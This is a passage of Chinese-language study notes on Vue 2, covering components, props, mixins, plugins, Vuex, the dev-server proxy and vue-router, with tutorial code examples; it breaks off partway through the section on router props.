### 53、对组建的理解

![](https://secure2.wostatic.cn/static/7aaopSTt2yHJEG2fmfyKm9/image.png?auth_key=1694396686-uHfHzCiHDPTVemdMDeabqM-0-a58348699d0b059a44608e8adaf3ff16)

### 54、非单文件组件

Vue中使用组件的三大步骤：

  一、定义组件(创建组件)

  二、注册组件

  三、使用组件(写组件标签)

  一、如何定义一个组件？

  使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；

  区别如下：

  1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。

  2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。

  备注：使用template可以配置组件结构。

  二、如何注册组件？

  1.局部注册：靠new Vue的时候传入components选项

  2.全局注册：靠Vue.component('组件名',组件)

  三、编写组件标签：

  <school></school>

```Vue
<!-- 准备好一个容器-->
    <div id="root">
      <hello></hello>
      <hr>
      <h1>{{msg}}</h1>
      <hr>
      <!-- 第三步：编写组件标签 -->
      <school></school>
      <hr>
      <!-- 第三步：编写组件标签 -->
      <student></student>
    </div>

    <div id="root2">
      <hello></hello>
    </div>
  </body>

  <script type="text/javascript">
    Vue.config.productionTip = false

    //第一步：创建school组件
    const school = Vue.extend({
      template:`
        <div class="demo">
          <h2>学校名称：{{schoolName}}</h2>
          <h2>学校地址：{{address}}</h2>
          <button @click="showName">点我提示学校名</button>  
        </div>
      `,
      // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
      data(){
        return {
          schoolName:'尚硅谷',
          address:'北京昌平'
        }
      },
      methods: {
        showName(){
          alert(this.schoolName)
        }
      },
    })

    //第一步：创建student组件
    const student = Vue.extend({
      template:`
        <div>
          <h2>学生姓名：{{studentName}}</h2>
          <h2>学生年龄：{{age}}</h2>
        </div>
      `,
      data(){
        return {
          studentName:'张三',
          age:18
        }
      }
    })
    
    //第一步：创建hello组件
    const hello = Vue.extend({
      template:`
        <div>  
          <h2>你好啊！{{name}}</h2>
        </div>
      `,
      data(){
        return {
          name:'Tom'
        }
      }
    })
    
    //第二步：全局注册组件
    Vue.component('hello',hello)

    //创建vm
    new Vue({
      el:'#root',
      data:{
        msg:'你好啊！'
      },
      //第二步：注册组件（局部注册）
      components:{
        school,
        student
      }
    })

    new Vue({
      el:'#root2',
    })
  </script>
```

用vue中的template属性写页面模板的时候，页面中与el匹配的div会被整个替换掉，不用这种方法时，与el匹配的div也会当作模板，被vue编译

### 55、组件的几个注意点

1.关于组件名:

  一个单词组成：

  第一种写法(首字母小写)：school

  第二种写法(首字母大写)：School

  多个单词组成：

  第一种写法(kebab-case命名)：my-school

  第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)

  备注：

  (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。

  (2).可以使用name配置项指定组件在开发者工具中呈现的名字。

  2.关于组件标签:

  第一种写法：<school></school>

  第二种写法：<school/>

  备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

  3.一个简写方式：

  const school = Vue.extend(options) 可简写为：const school = options

  ![](https://secure2.wostatic.cn/static/4pP1YxXpa38Axn7PDuuhXT/image.png?auth_key=1694396687-pBbAUY9HoPRtiH3pZ3RjPT-0-75e4abb0755e3675fa70f6ff5bf7fa35)

简写的时候会在注册组建的时候执行vue.extend()

### 56、组件的嵌套

```Vue
<body>
    <!-- 准备好一个容器-->
    <div id="root">
    </div>
  </body>

  <script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    //定义student组件
    const student = Vue.extend({
      name:'student',
      template:`
        <div>
          <h2>学生姓名：{{name}}</h2>  
          <h2>学生年龄：{{age}}</h2>  
        </div>
      `,
      data(){
        return {
          name:'尚硅谷',
          age:18
        }
      }
    })
    
    //定义school组件
    const school = Vue.extend({
      name:'school',
      template:`
        <div>
          <h2>学校名称：{{name}}</h2>  
          <h2>学校地址：{{address}}</h2>  
          <student></student>
        </div>
      `,
      data(){
        return {
          name:'尚硅谷',
          address:'北京'
        }
      },
      //注册组件（局部）
      components:{
        student
      }
    })

    //定义hello组件
    const hello = Vue.extend({
      template:`<h1>{{msg}}</h1>`,
      data(){
        return {
          msg:'欢迎来到尚硅谷学习！'
        }
      }
    })
    
    //定义app组件
    const app = Vue.extend({
      template:`
        <div>  
          <hello></hello>
          <school></school>
        </div>
      `,
      components:{
        school,
        hello
      }
    })

    //创建vm
    new Vue({
      template:'<app></app>',
      el:'#root',
      //注册组件（局部）
      components:{app}
    })
  </script>
```

开发中会有一个app组件来管理所有组件，vm管理app，一人之下万人之上

### 57、VueComponent构造函数

关于VueComponent：

  1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

  2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，

  即Vue帮我们执行的：new VueComponent(options)。

  3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

  4.关于this指向：

  (1).组件配置中：

  data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。

  (2).new Vue(options)配置中：

  data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

  5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。

  Vue的实例对象，以后简称vm。

### 58、vue实例和组件实例

不一样，el在vc中不能使用；data在vc必须写成函数，在vm中可以写成对象

### 59、一个重要的内置关系

1.一个重要的内置关系：VueComponent.prototype.**proto** === Vue.prototype

  2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

### 60、单文件组件

main.js是入口文件，创建vue实例，并指明为那个容器服务，实例里会注册app组件

app.vue是汇总所有组件的

### 62、分析脚手架架构

babel的控制文件，将es6=>es5

包的说明书，什么名字、版本、依赖、库、命令

build命令是构建，最后的一次编译，先把整个工程变成浏览器能够认识的东西

lint是进行语法检查

serve开发过程中使用，让配置好服务器，把东西都弄好了

包版本配置文件，锁住版本号，再次下载的时候不会自动升版本

放静态资源

**index文件**：

![](https://secure2.wostatic.cn/static/i8Dae7Y6aJ9s21eCxFTVGe/image.png?auth_key=1694396689-2WWLhgrhTXLffvKSd38qua-0-de5666bc77c951c92989e9cdc936792b)

#### 脚手架文件结构

  ├── node_modules

  ├── public

  │ ├── favicon.ico: 页签图标

  │ └── index.html: 主页面

  ├── src

  │ ├── assets: 存放静态资源

  │ │ └── logo.png

  │ │── component: 存放组件

  │ │ └── HelloWorld.vue

  │ │── App.vue: 汇总所有组件

  │ │── main.js: 入口文件

  ├── .gitignore: git版本管制忽略的配置

  ├── babel.config.js: babel的配置文件

  ├── package.json: 应用包配置文件

  ├── [README.md](http://README.md): 应用描述文件

  ├── package-lock.json：包版本控制文件

### 63、render函数

引入完整版vue，才有模板解析器，才能这么用。

否则，残缺版vue不能这么用，只能利用render函数。最好是用残缺版vue，因为完整版中vue模板解析器占了1/3体积，后续没有必要存在。.vue里的template有

![](https://secure2.wostatic.cn/static/6i6psyjhiEKoNYBfKgdLuJ/image.png?auth_key=1694396689-iCyL62nbNuFdki7cCbBHrL-0-12e599860cb28c47b9701c026cff9ae1)

来解析.

关于不同版本的Vue：

  1.vue.js与vue.runtime.xxx.js的区别：

  (1).vue.js是完整版的Vue，包含：核心功能+模板解析器。

  (2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。

  2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用

  render函数接收到的createElement函数去指定具体内容。



render:h=>h(App) 这是：

1、ES6的写法，表示Vue实例选项对象的render方法作为一个函数，接受传入的参数h函数，返回h(App)的函数调用结果

2、Vue在创建Vue实例时，通过调用render方法来渲染实例的DOM树

3、Vue在调用render方法时，会传入一个createElement函数作为参数，也就是这里的h的实参是createElement函数，然后createElement会以App为参数进行调用，关于createElement函数说明参见：

### 64、修改默认配置

vue inspect > output.js 命令可以把脚手架配置整理成js文件显示出来。

修改配置都是在此文件下修改，具体内容可以查看官网vuecli 配置参考；这个文件进行修改一定要重新npm run serve

### 65、ref属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
    1. 打标识：`<h1 ref="xxx">.....</h1>` 或 `<School ref="xxx"></School>`
    2. 获取：`this.$refs.xxx`

### 66、props配置

子组件：

```Vue
<template>
  <div>
    <h1>{{msg}}</h1>
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>学生年龄：{{myAge+1}}</h2>
    <button @click="updateAge">尝试修改收到的年龄</button>
  </div>
</template>

<script>
  export default {
    name:'Student',
    data() {
      console.log(this)
      return {
        msg:'我是一个尚硅谷的学生',
        myAge:this.age//优先级问题，props优先被接受，所以才能赋值给data中的数据
      }
    },
    methods: {
      updateAge(){
        this.myAge++
      }
    },
    //简单声明接收
    // props:['name','age','sex'] 

    //接收的同时对数据进行类型限制
    /* props:{
      name:String,
      age:Number,
      sex:String
    } */

    //接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
    props:{
      name:{
        type:String, //name的类型是字符串
        required:true, //name是必要的
      },
      age:{
        type:Number,
        default:99 //默认值
      },
      sex:{
        type:String,
        required:true
      }
    }
  }
</script>
```

父组件：

```Vue
<template>
  <div>
    <Student name="李四" sex="女" :age="18"/>
  </div>
</template>

<script>
  import Student from './components/Student'

  export default {
    name:'App',
    components:{Student}
  }
</script>

```

1. 功能：让组件接收外部传过来的数据
2. 传递数据：`<Demo name="xxx"/>`
3. 接收数据：
    1. 第一种方式（只接收）：`props:['name'] `
    2. 第二种方式（限制类型）：`props:{name:String}`
    3. 第三种方式（限制类型、限制必要性、指定默认值）：

```JavaScript
props:{
  name:{
  type:String, //类型
  required:true, //必要性
  default:'老王' //默认值
  }
}
```

    > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

    props的数据直接挂载在vc/vm上能直接使用，computed中也可以使用props上的数据

### 67、mixin混入

1. 功能：可以把多个组件共用的配置提取成一个混入对象
2. 使用方式：

    第一步定义混合：

```Vue
{
    data(){....},
    methods:{....}
    ....
}
```

    第二步使用混入：

      import name from ****

      全局混入：`Vue.mixin(name)`

      局部混入：`mixins:[name]  `

当data,methos里数据定义的值冲突时，vue采用的是本身组件定义的值，剩下的都合并在一起；

生命周期函数是不以任何人为主，都要。

### 68、插件

插件本质上是一个对象，但是对象中一定包含着install方法



1. 功能：用于增强Vue
2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。
3. 定义插件：

```JavaScript
对象.install = function (Vue, options) {
    // 1. 添加全局过滤器
    Vue.filter(....)

    // 2. 添加全局指令
    Vue.directive(....)

    // 3. 配置全局混入(合)
    Vue.mixin(....)

    // 4. 添加实例方法
    Vue.prototype.$myMethod = function () {...}
    Vue.prototype.$myProperty = xxxx
}
```
4. 使用插件：`Vue.use()`

### 69、scoped样式

多个组件的样式命名重复时，后面引入的会覆盖掉前面引入组件的样式。

加入scoped属性就可以只限制在自己的组件上：

```Vue
<style scoped>
  .demo{
    background-color: skyblue;
  }
</style>
```

原理：每次都会生成一个随机的标签属性，通过设置的class配合标签属性就能给指定的标签添加样式。

![](https://secure2.wostatic.cn/static/jMpkCmJchhmAqY8SeEAC4v/image.png?auth_key=1694396692-iveRrijzNEQ2AeinDVSBZ3-0-75a7c23f375722829374c2f5821166b7)



#### 查看插件的版本：

1. 作用：让样式在局部生效，防止冲突。
2. 写法：`<style scoped>`

#### shift art f 自动调整格式

### 70-77 todoList案例

1. 组件化编码流程：

    (1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

    (2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

    1).一个组件在用：放在组件自身即可。

    2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

    (3).实现交互：从绑定事件开始。
2. props适用于：

    (1).父组件 ==> 子组件 通信

    (2).子组件 ==> 父组件 通信（要求父先给子一个函数）
3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！
4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

### 78、webstorage

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）
2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。
3. 相关API：
    1. `xxxxxStorage.setItem('key', 'value');`

        该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。
    2. `xxxxxStorage.getItem('person');`

        该方法接受一个键名作为参数，返回键名对应的值。
    3. `xxxxxStorage.removeItem('key');`

        该方法接受一个键名作为参数，并把该键名从存储中删除。
    4. ` xxxxxStorage.clear()`

        该方法会清空存储中的所有数据。
4. 备注：
    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
    2. LocalStorage存储的内容，需要手动清除才会消失。
    3. `xxxxxStorage.getItem(xxx)`如果xxx对应的value获取不到，那么getItem的返回值是null。
    4. `JSON.parse(null)`的结果依然是null。

### 80-82、组件自定义事件

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>
2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。
3. 绑定自定义事件：
    1. 第一种方式，在父组件中：`<Demo @atguigu="test"/>`  或 `<Demo v-on:atguigu="test"/>`
    2. 第二种方式，在父组件中：

```JavaScript
<Demo ref="demo"/>
......
mounted(){
   this.$refs.Demo.$on('atguigu',this.test)
   // this.$refs.Demo.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）
}
```
    3. 若想让自定义事件只能触发一次，可以使用`once`修饰符，或`$once`方法。
4. 触发自定义事件：`this.$emit('atguigu',数据)`，如果事件有很多个    
5. 解绑自定义事件`this.$off('atguigu')` `this.$off(['atguigu','**'])//`解绑多个自定义事件`this.$off()//`解绑所有自定义事件
6. 组件上也可以绑定原生DOM事件，需要使用`native`修饰符。
7. 注意：通过`this.$refs.xxx.$on('atguigu',回调)`绑定自定义事件时，回调要么配置在methods中要么用箭头函数，否则this指向会出问题！

#### 自己理解：

  emit 和 on必须是在同个组件内，emit才能触发同组件的on,但是父元素将on的绑定事件的回调函数留在自身，所以就能传递数据。

### 84、全局事件总线

1. 一种组件间通信的方式，适用于任意组件间通信。
2. 安装全局事件总线：

```JavaScript
new Vue({
  ......
  beforeCreate() {
    Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
  },
    ......
}) 
```
3. 使用事件总线：
    1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。

```JavaScript
methods(){
  demo(data){......}
}
......
mounted() {
  this.$bus.$on('xxxx',this.demo)
}
```
    2. 提供数据：`this.$bus.$emit('xxxx',数据)`
4. 最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件。

#### 给谁绑的事件就找谁触发

### 85、消息订阅与发布

1. 一种组件间通信的方式，适用于任意组件间通信。
2. 使用步骤：
    1. 安装pubsub：`npm i pubsub-js`
    2. 引入: `import pubsub from 'pubsub-js'`
    3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身。

```JavaScript
methods(){
  demo(data){......}
}
......
mounted() {
  this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
}
```
    4. 提供数据：`pubsub.publish('xxx',数据)`
    5. 最好在beforeDestroy钩子中，用`PubSub.unsubscribe(pid)`去取消订阅。

### 90、$nextTick

1. 语法：`this.$nextTick(回调函数)`
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。
4. ### 91-94、动画和过度

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。
2. 图示：
3. 写法：
    1. 准备好样式：
        - 元素进入的样式：
            1. v-enter：进入的起点
            2. v-enter-active：进入过程中
            3. v-enter-to：进入的终点
        - 元素离开的样式：
            1. v-leave：离开的起点
            2. v-leave-active：离开过程中
            3. v-leave-to：离开的终点
    2. 使用`<transition>`包裹要过度的元素，并配置name属性：

```Vue
<transition name="hello">
  <h1 v-show="isShow">你好啊！</h1>
</transition>
```
    3. 备注：若有多个元素需要过度，则需要使用：`<transition-group>`，且每个元素都要指定`key`值。

### 96-97配置代理

#### 方法一

  在vue.config.js中添加如下配置：

```JavaScript
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

#### 方法二

  编写vue.config.js配置具体代理规则：

```JavaScript
module.exports = {
  devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,//不写默认为true;是否告诉服务器是从哪里请求的真实端口号，true的话跟请求服务器一个端口号，否则是和自身一个端口号
        pathRewrite: {'^/api1': ''}//重写路径，请求的路径由/api变更为空
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''},
        ws:true//用于支持websocket
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀

解决方法：在main.js中加上这句话axios.defaults.baseURL = '/api';

每次请求时不想写端口号和域名时，devServer中可以配置如下的

host: 'localhost',

  port: 8080,

### 102-104、插槽

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于父组件 ===> 子组件 。
2. 分类：默认插槽、具名插槽、作用域插槽
3. 使用方式：
    1. 默认插槽：

```Vue
父组件中：
        <Category>
           <div>html结构1</div>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot>插槽默认内容...</slot>
            </div>
        </template>
```

        //父组件传递的结构是先解析再传递给子组件

20_src_github搜索案例
  1. 具名插槽：

```Vue
父组件中：
        <Category>
            <template slot="center">
              <div>html结构1</div>
            </template>

            <template v-slot:footer>
               <div>html结构2</div>
            </template>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot name="center">插槽默认内容...</slot>
               <slot name="footer">插槽默认内容...</slot>
            </div>
        </template>
```
  2. 作用域插槽：
      1. 理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）
      2. 具体编码：

```Vue
父组件中：
    <Category>
      <template scope="scopeData">
        <!-- 生成的是ul列表 -->
        <ul>
          <li v-for="g in scopeData.games" :key="g">{{g}}</li>
        </ul>
      </template>
    </Category>
    <Category>
      <template scope="{games}">
        <!-- 生成的是ul列表 -->
        <ul>
          <li v-for="g in games" :key="g">{{g}}</li>
        </ul>
      </template>
    </Category>
    <Category>
      <template slot-scope="scopeData">
        <!-- 生成的是h4标题 -->
        <h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
      </template>
    </Category>
子组件中：
        <template>
            <div>
                <slot :games="games"></slot>
            </div>
        </template>
    
        <script>
            export default {
                name:'Category',
                props:['title'],
                //数据在子组件自身
                data() {
                    return {
                        games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                    }
                },
            }
        </script>
```

### 107、vuex

分析：actions作用，在这里调用后端接口，获取请求得到的数据；而且有逻辑的时候也需要actions

也可以直接在组件中调用commit，不走actions，直接把东西给mutations.

devtools是vuex出的一个开发者调试工具；

actions mutations states对象需要有store仓库去管理

![](https://secure2.wostatic.cn/static/pEB4xhMTTFANLYP6vmXmqV/image.png?auth_key=1694396710-5qZTabK5AHTd53E4GC7SHe-0-737e38d87074fd07a34676ec1115b810)

![](https://secure2.wostatic.cn/static/gXxH71AnCbbvwNzgrg23vy/image.png?auth_key=1694396710-uKcBh8xxaGgibYvXV9Pfsk-0-fcb73e424f0a8a78c730cf3063c6c027)

#### **1.概念**

  在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

#### **2.何时使用？**

  多个组件需要共享数据时

#### **3.搭建vuex环境**

1. 创建文件：`src/store/index.js`

```JavaScript
//引入Vue核心库
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions对象——响应组件中用户的动作
const actions = {}
//准备mutations对象——修改state中的数据
const mutations = {}
//准备state对象——保存具体的数据
const state = {}

//创建并暴露store
export default new Vuex.Store({
  actions,
  mutations,
  state
})
```
2. 在`main.js`中创建vm时传入`store`配置项

```JavaScript
......
//引入store
import store from './store'
......

//创建vm
new Vue({
  el:'#app',
  render: h => h(App),
  store
})
```

#### **4.基本使用**

1. 初始化数据、配置`actions`、配置`mutations`，操作文件`store.js`

```JavaScript
//引入Vue核心库
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//引用Vuex
Vue.use(Vuex)

const actions = {
    //响应组件中加的动作
  jia(context,value){
    // console.log('actions中的jia被调用了',miniStore,value)
    context.commit('JIA',value)
  },
}

const mutations = {
    //执行加
  JIA(state,value){
    // console.log('mutations中的JIA被调用了',state,value)
    state.sum += value
  }
}

//初始化数据
const state = {
   sum:0
}

//创建并暴露store
export default new Vuex.Store({
  actions,
  mutations,
  state,
})
```
2. 组件中读取vuex中的数据：`$store.state.sum`
3. 组件中修改vuex中的数据：`$store.dispatch('action中的方法名',数据)` 或 `$store.commit('mutations中的方法名',数据)`

    > 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写`dispatch`，直接编写`commit`

#### **5.getters的使用**

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。
2. 在`store.js`中追加`getters`配置

```JavaScript
......

const getters = {
  bigSum(state){
    return state.sum * 10
  }
}

//创建并暴露store
export default new Vuex.Store({
  ......
  getters
})
```
3. 组件中读取数据：`$store.getters.bigSum`

#### **6.四个map方法的使用**

1. <strong>mapState方法：</strong>用于帮助我们映射`state`中的数据为计算属性

```JavaScript
computed: {
    //借助mapState生成计算属性：sum、school、subject（对象写法）
     ...mapState({sum:'sum',school:'school',subject:'subject'}),
         
    //借助mapState生成计算属性：sum、school、subject（数组写法）
    ...mapState(['sum','school','subject']),
},
```
2. <strong>mapGetters方法：</strong>用于帮助我们映射`getters`中的数据为计算属性

```JavaScript
computed: {
    //借助mapGetters生成计算属性：bigSum（对象写法）
    ...mapGetters({bigSum:'bigSum'}),

    //借助mapGetters生成计算属性：bigSum（数组写法）
    ...mapGetters(['bigSum'])
},
```
3. <strong>mapActions方法：</strong>用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数

```JavaScript
methods:{
    //靠mapActions生成：incrementOdd、incrementWait（对象形式）
    ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

    //靠mapActions生成：incrementOdd、incrementWait（数组形式）
    ...mapActions(['jiaOdd','jiaWait'])
}
```
4. <strong>mapMutations方法：</strong>用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数

```JavaScript
methods:{
    //靠mapActions生成：increment、decrement（对象形式）
    ...mapMutations({increment:'JIA',decrement:'JIAN'}),
    
    //靠mapMutations生成：JIA、JIAN（对象形式）
    ...mapMutations(['JIA','JIAN']),
}
```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

#### **7.模块化+命名空间**

1. 目的：让代码更好维护，让多种数据分类更加明确。
2. 修改`store.js`

```JavaScript
const countAbout = {
  namespaced:true,//开启命名空间
  state:{x:1},
  mutations: { ... },
  actions: { ... },
  getters: {
    bigSum(state){
       return state.sum * 10
    }
  }
}

const personAbout = {
  namespaced:true,//开启命名空间
  state:{ ... },
  mutations: { ... },
  actions: { ... }
}

const store = new Vuex.Store({
  modules: {
    countAbout,
    personAbout
  }
})
```
3. 开启命名空间后，组件中读取state数据：

```JavaScript
//方式一：自己直接读取
this.$store.state.personAbout.list
//方式二：借助mapState读取：
...mapState('countAbout',['sum','school','subject']),
```
4. 开启命名空间后，组件中读取getters数据：

```JavaScript
//方式一：自己直接读取
this.$store.getters['personAbout/firstPersonName']
//方式二：借助mapGetters读取：
...mapGetters('countAbout',['bigSum'])
```
5. 开启命名空间后，组件中调用dispatch

```JavaScript
//方式一：自己直接dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//方式二：借助mapActions：
...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
```
6. 开启命名空间后，组件中调用commit

```JavaScript
//方式一：自己直接commit
this.$store.commit('personAbout/ADD_PERSON',person)
//方式二：借助mapMutations：
...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
```

### 117、vue路由

1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件。

#### 1.基本使用

1. 安装vue-router，命令：`npm i vue-router`
2. 应用插件：`Vue.use(VueRouter)`
3. 编写router配置项:

```JavaScript
//引入VueRouter
import VueRouter from 'vue-router'
//引入Luyou 组件
import About from '../components/About'
import Home from '../components/Home'

//创建router实例对象，去管理一组一组的路由规则
const router = new VueRouter({
  routes:[
    {
      path:'/about',
      component:About
    },
    {
      path:'/home',
      component:Home
    }
  ]
})

//暴露router
export default router
```
4. 实现切换（active-class可配置高亮样式）

```Vue
<router-link active-class="active" to="/about">About</router-link>
```
5. 指定展示位置

```Vue
<router-view></router-view>
```

#### 2.几个注意点

1. 路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的`$route`属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的`$router`属性获取到。

#### 3.多级路由（多级路由）

1. 配置路由规则，使用children配置项：

```JavaScript
routes:[
  {
    path:'/about',
    component:About,
  },
  {
    path:'/home',
    component:Home,
    children:[ //通过children配置子级路由
      {
        path:'news', //此处一定不要写：/news
        component:News
      },
      {
        path:'message',//此处一定不要写：/message
        component:Message
      }
    ]
  }
]
```
2. 跳转（要写完整路径）：

```Vue
<router-link to="/home/news">News</router-link>
```

#### 4.路由的query参数

1. 传递参数

```Vue
<!-- 跳转并携带query参数，to的字符串写法 -->
<router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
<!-- 跳转并携带query参数，to的对象写法 -->
<router-link 
  :to="{
    path:'/home/message/detail',
    query:{
       id:666,
            title:'你好'
    }
  }"
>跳转</router-link>


<!-- 跳转路由并携带query参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link>&nbsp;&nbsp; -->

        <!-- 跳转路由并携带query参数，to的对象写法 -->
        <router-link :to="{
          path:'/home/message/detail',
          query:{
            id:m.id,
            title:m.title
          }
        }">
          {{m.title}}
        </router-link>

```
2. 接收参数：

```JavaScript
$route.query.id
$route.query.title
```

#### 5.命名路由

1. 作用：可以简化路由的跳转。
2. 如何使用
    1. 给路由命名：

```JavaScript
{
  path:'/demo',
  component:Demo,
  children:[
    {
      path:'test',
      component:Test,
      children:[
        {
                      name:'hello' //给路由命名
          path:'welcome',
          component:Hello,
        }
      ]
    }
  ]
}
```
    2. 简化跳转：

```Vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数 -->
<router-link 
  :to="{
    name:'hello',
    query:{
       id:666,
            title:'你好'
    }
  }"
>跳转</router-link>
```

#### 6.路由的params参数

1. 配置路由，声明接收params参数

```JavaScript
{
  path:'/home',
  component:Home,
  children:[
    {
      path:'news',
      component:News
    },
    {
      component:Message,
      children:[
        {
          name:'xiangqing',
          path:'detail/:id/:title', //使用占位符声明接收params参数
          component:Detail
        }
      ]
    }
  ]
}
```
2. 传递参数

```Vue
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="/home/message/detail/666/你好">跳转</router-link>
        
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
  :to="{
    name:'xiangqing',
    params:{
       id:666,
            title:'你好'
    }
  }"
>跳转</router-link>


<!-- 跳转路由并携带params参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link>&nbsp;&nbsp; -->

        <!-- 跳转路由并携带params参数，to的对象写法 -->
        <router-link :to="{
          name:'xiangqing',
          params:{
            id:m.id,
            title:m.title
          }
        }">
          {{m.title}}
        </router-link>

```

    > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！
3. 接收参数：

```JavaScript
$route.params.id
$route.params.title
```

#### 7.路由的props配置

  作用：让路由组件更方便的收到参数

```JavaScript
{
  name:'xiangqing',
  path:'detail/:id',
  component:Detail,

  //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
  // props:{a:900}

  //第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
  // props:true
  
